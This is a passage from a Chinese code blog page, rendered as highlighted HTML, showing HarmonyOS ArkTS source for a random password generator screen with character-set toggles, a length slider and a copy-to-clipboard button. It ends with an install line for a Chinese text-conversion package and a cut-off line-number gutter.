class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 使用装饰器定义一个可观察的类，用于密码选项</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PasswordOption</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: string; <span class="comment">// 选项名称</span></span><br><span class="line">  <span class="attr">characters</span>: string; <span class="comment">// 该选项对应的字符集</span></span><br><span class="line">  <span class="comment">// 定义是否选中，默认为true</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">selected</span>: boolean = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">// 定义是否启用，默认为true</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">enabled</span>: boolean = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构造函数，初始化name和characters</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: string, characters: string</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">characters</span> = characters;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 使用装饰器定义一个入口组件</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">PasswordGeneratorPage</span> &#123;</span><br><span class="line">  <span class="comment">// 定义密码选项数组</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">options</span>: <span class="title class_">PasswordOption</span>[] = [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">PasswordOption</span>(<span class="string">&quot;大写字母&quot;</span>, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">PasswordOption</span>(<span class="string">&quot;小写字母&quot;</span>, <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">PasswordOption</span>(<span class="string">&quot;数字&quot;</span>, <span class="string">&quot;0123456789&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">PasswordOption</span>(<span class="string">&quot;特殊字符&quot;</span>, <span class="string">&quot;!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?&quot;</span>),</span><br><span class="line">  ];</span><br><span class="line">  <span class="comment">// 定义密码长度状态，默认值为10</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">passwordLength</span>: number = <span class="number">10</span>;</span><br><span class="line">  <span class="comment">// 基础间距</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">baseSpacing</span>: number = <span class="number">30</span>;</span><br><span class="line">  <span class="comment">// 生成的密码</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">generatedPassword</span>: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// 是否启用复制按钮</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isCopyButtonEnabled</span>: boolean = <span class="literal">false</span>;</span><br><span class="line">  <span class="comment">// 主题色</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">primaryColor</span>: string = <span class="string">&#x27;#71dec7&#x27;</span>;</span><br><span class="line">  <span class="comment">// 字体颜色</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">fontColor</span>: string = <span class="string">&quot;#2e2e2e&quot;</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 生成密码的方法</span></span><br><span class="line">  <span class="title function_">generatePassword</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> characterSet = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 初始化字符集合</span></span><br><span class="line">    <span class="comment">// 遍历所有选项，如果选项被选中则加入字符集合</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> option <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">options</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (option.<span class="property">selected</span>) &#123;</span><br><span class="line">        characterSet += option.<span class="property">characters</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> password = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 初始化密码字符串</span></span><br><span class="line">    <span class="comment">// 根据密码长度生成随机密码</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">passwordLength</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> randomIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * characterSet.<span class="property">length</span>);</span><br><span class="line">      password += characterSet[randomIndex];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">generatedPassword</span> = password; <span class="comment">// 更新生成的密码</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 复制到剪贴板的方法</span></span><br><span class="line">  <span class="title function_">copyToClipboard</span>(<span class="params">text: string</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> pasteboardData = pasteboard.<span class="title function_">createData</span>(pasteboard.<span class="property">MIMETYPE_TEXT_PLAIN</span>, text); <span class="comment">// 创建剪贴板数据</span></span><br><span class="line">    <span class="keyword">const</span> systemPasteboard = pasteboard.<span class="title function_">getSystemPasteboard</span>(); <span class="comment">// 获取系统剪贴板</span></span><br><span class="line">    systemPasteboard.<span class="title function_">setData</span>(pasteboardData); <span class="comment">// 将数据放入剪切板</span></span><br><span class="line">    promptAction.<span class="title function_">showToast</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;已复制&#x27;</span> &#125;); <span class="comment">// 显示复制成功的提示</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 检查选项选择状态的方法</span></span><br><span class="line">  <span class="title function_">checkOptionsSelection</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> selectedCount = <span class="number">0</span>; <span class="comment">// 记录已选中的选项数量</span></span><br><span class="line">    <span class="keyword">let</span> lastSelectedIndex = <span class="number">0</span>; <span class="comment">// 记录最后一个选中的选项索引</span></span><br><span class="line">    <span class="comment">// 遍历所有选项</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">options</span>[i].<span class="property">enabled</span> = <span class="literal">true</span>; <span class="comment">// 默认启用所有选项</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>[i].<span class="property">selected</span>) &#123;</span><br><span class="line">        lastSelectedIndex = i; <span class="comment">// 更新最后一个选中的选项索引</span></span><br><span class="line">        selectedCount++; <span class="comment">// 增加选中计数</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果只有一个选项被选中，则禁用该选项防止其被取消选中</span></span><br><span class="line">    <span class="keyword">if</span> (selectedCount === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">options</span>[lastSelectedIndex].<span class="property">enabled</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建页面布局的方法</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123;</span><br><span class="line">      <span class="comment">// 标题栏</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">&quot;随机密码生成&quot;</span>)</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)<span class="comment">// 设置宽度为100%</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="number">54</span>)<span class="comment">// 设置高度为54</span></span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="number">18</span>)<span class="comment">// 设置字体大小</span></span><br><span class="line">        .<span class="title function_">fontWeight</span>(<span class="number">600</span>)<span class="comment">// 设置字体粗细</span></span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)<span class="comment">// 设置背景颜色</span></span><br><span class="line">        .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// 设置文本居中对齐</span></span><br><span class="line">        .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>); <span class="comment">// 设置字体颜色</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 密码长度设置部分</span></span><br><span class="line">      <span class="title class_">Column</span>() &#123;</span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`密码长度：`</span>)<span class="comment">// 密码长度标签</span></span><br><span class="line">            .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>);</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.passwordLength&#125;</span>`</span>)<span class="comment">// 显示当前密码长度</span></span><br><span class="line">            .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">primaryColor</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>, <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span> &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 滑动条设置密码长度</span></span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;4&#x27;</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>).<span class="title function_">width</span>(<span class="number">20</span>);</span><br><span class="line">          <span class="title class_">Slider</span>(&#123;</span><br><span class="line">            <span class="attr">value</span>: <span class="variable language_">this</span>.<span class="property">passwordLength</span>, <span class="comment">// 当前值</span></span><br><span class="line">            <span class="attr">min</span>: <span class="number">4</span>, <span class="comment">// 最小值</span></span><br><span class="line">            <span class="attr">max</span>: <span class="number">32</span>, <span class="comment">// 最大值</span></span><br><span class="line">            <span class="attr">style</span>: <span class="title class_">SliderStyle</span>.<span class="property">InSet</span> <span class="comment">// 滑动条样式</span></span><br><span class="line">          &#125;)</span><br><span class="line">            .<span class="title function_">layoutWeight</span>(<span class="number">1</span>)<span class="comment">// 布局权重</span></span><br><span class="line">            .<span class="title function_">blockColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)<span class="comment">// 滑块颜色</span></span><br><span class="line">            .<span class="title function_">trackColor</span>(<span class="string">&#x27;#EBEBEB&#x27;</span>)<span class="comment">// 轨道颜色</span></span><br><span class="line">            .<span class="title function_">trackThickness</span>(<span class="number">30</span>)<span class="comment">// 轨道厚度</span></span><br><span class="line">            .<span class="title function_">blockSize</span>(&#123; <span class="attr">width</span>: <span class="number">55</span>, <span class="attr">height</span>: <span class="number">55</span> &#125;)<span class="comment">// 滑块大小</span></span><br><span class="line">            .<span class="title function_">selectedColor</span>(<span class="variable language_">this</span>.<span class="property">primaryColor</span>)<span class="comment">// 选中颜色</span></span><br><span class="line">            .<span class="title function_">onChange</span>(<span class="function">(<span class="params">value: number, mode: SliderChangeMode</span>) =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">passwordLength</span> = value; <span class="comment">// 更新密码长度</span></span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;value:&#x27;</span> + value + <span class="string">&#x27;mode&#x27;</span> + mode.<span class="property">toString</span>); <span class="comment">// 打印日志</span></span><br><span class="line">            &#125;);</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;32&#x27;</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>).<span class="title function_">width</span>(<span class="number">20</span>);</span><br><span class="line">        &#125;.<span class="title function_">margin</span>(&#123;</span><br><span class="line">          <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">          <span class="attr">right</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">          <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 选项设置部分</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;选项&#x27;</span>)</span><br><span class="line">          .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>, <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>, <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span> &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 动态生成每个选项的UI元素</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">options</span>, <span class="function">(<span class="params">option: PasswordOption, index: number</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title class_">Row</span>() &#123;</span><br><span class="line">            <span class="title class_">Text</span>(option.<span class="property">name</span>)<span class="comment">// 选项名称</span></span><br><span class="line">              .<span class="title function_">fontWeight</span>(<span class="number">400</span>)</span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="number">16</span>)</span><br><span class="line">              .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>)</span><br><span class="line">              .<span class="title function_">layoutWeight</span>(<span class="number">1</span>);</span><br><span class="line">            <span class="title class_">Toggle</span>(&#123; <span class="attr">type</span>: <span class="title class_">ToggleType</span>.<span class="property">Switch</span>, <span class="attr">isOn</span>: option.<span class="property">selected</span> &#125;)<span class="comment">// 切换按钮</span></span><br><span class="line">              .<span class="title function_">width</span>(<span class="string">&#x27;100lpx&#x27;</span>)</span><br><span class="line">              .<span class="title function_">height</span>(<span class="string">&#x27;50lpx&#x27;</span>)</span><br><span class="line">              .<span class="title function_">enabled</span>(option.<span class="property">enabled</span>)<span class="comment">// 是否启用切换</span></span><br><span class="line">              .<span class="title function_">selectedColor</span>(<span class="variable language_">this</span>.<span class="property">primaryColor</span>)</span><br><span class="line">              .<span class="title function_">onChange</span>(<span class="function">(<span class="params">isOn: boolean</span>) =&gt;</span> &#123;</span><br><span class="line">                option.<span class="property">selected</span> = isOn; <span class="comment">// 更新选项状态</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">checkOptionsSelection</span>(); <span class="comment">// 检查选项选择状态</span></span><br><span class="line">              &#125;);</span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">          .<span class="title function_">padding</span>(&#123;</span><br><span class="line">            <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">right</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing / <span class="number">3</span>&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing / <span class="number">3</span>&#125;</span>lpx`</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">hitTestBehavior</span>(<span class="title class_">HitTestMode</span>.<span class="property">Block</span>)</span><br><span class="line">          .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (option.<span class="property">enabled</span>) &#123;</span><br><span class="line">              option.<span class="property">selected</span> = !option.<span class="property">selected</span>; <span class="comment">// 切换选项状态</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 生成密码按钮</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;生成密码&#x27;</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="variable language_">this</span>.<span class="property">primaryColor</span>)</span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">54</span>)</span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="number">650</span> - <span class="variable language_">this</span>.baseSpacing * <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123;</span><br><span class="line">            <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">right</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">HEAVY</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;)<span class="comment">// 点击效果</span></span><br><span class="line">          .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">generatePassword</span>(); <span class="comment">// 生成密码</span></span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span> &#125;)</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">      .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">      .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 显示生成的密码</span></span><br><span class="line">      <span class="title class_">Column</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`密码结果：`</span>)</span><br><span class="line">          .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123;</span><br><span class="line">            <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">          &#125;);</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.generatedPassword&#125;</span>`</span>)<span class="comment">// 显示生成的密码</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">primaryColor</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">          .<span class="title function_">padding</span>(&#123; <span class="attr">left</span>: <span class="number">5</span>, <span class="attr">right</span>: <span class="number">5</span> &#125;)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123;</span><br><span class="line">            <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing / <span class="number">3</span>&#125;</span>lpx`</span></span><br><span class="line">          &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 复制按钮</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;复制&#x27;</span>)</span><br><span class="line">          .<span class="title function_">enabled</span>(<span class="variable language_">this</span>.<span class="property">generatedPassword</span> ? <span class="literal">true</span> : <span class="literal">false</span>)<span class="comment">// 只有生成了密码才启用复制按钮</span></span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="variable language_">this</span>.<span class="property">primaryColor</span>)</span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">54</span>)</span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="number">650</span> - <span class="variable language_">this</span>.baseSpacing * <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123;</span><br><span class="line">            <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">right</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">HEAVY</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;)</span><br><span class="line">          .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">copyToClipboard</span>(<span class="variable language_">this</span>.<span class="property">generatedPassword</span>); <span class="comment">// 复制密码</span></span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">      .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span> &#125;)</span><br><span class="line">      .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#f2f3f5&quot;</span>); <span class="comment">// 页面背景颜色</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="chinese"><a href="#chinese" class="headerlink" title="chinese"></a>chinese</h1><p>ohpm install @nutpi&#x2F;chinese_transverter</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span 